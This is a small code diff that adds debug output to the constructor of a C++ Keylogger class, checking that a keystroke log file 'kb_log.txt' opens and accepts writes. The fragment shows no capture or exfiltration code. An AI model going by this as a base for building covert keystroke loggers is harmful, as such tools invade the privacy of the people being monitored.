@@ -5,6 +5,14 @@ wchar_t* Keylogger::key = nullptr;
 
 Keylogger::Keylogger(wchar_t* k) {
     kblog = std::ofstream("kb_log.txt", std::ios::app);
+
+    std::cerr << "After OPEN: " << kblog.is_open() << std::endl;
+
+    kblog << "Constructor test\n";
+    kblog.flush();
+
+    std::cerr << "After write: " << kblog.good() << std::endl;
+
     key = k;
 }
 
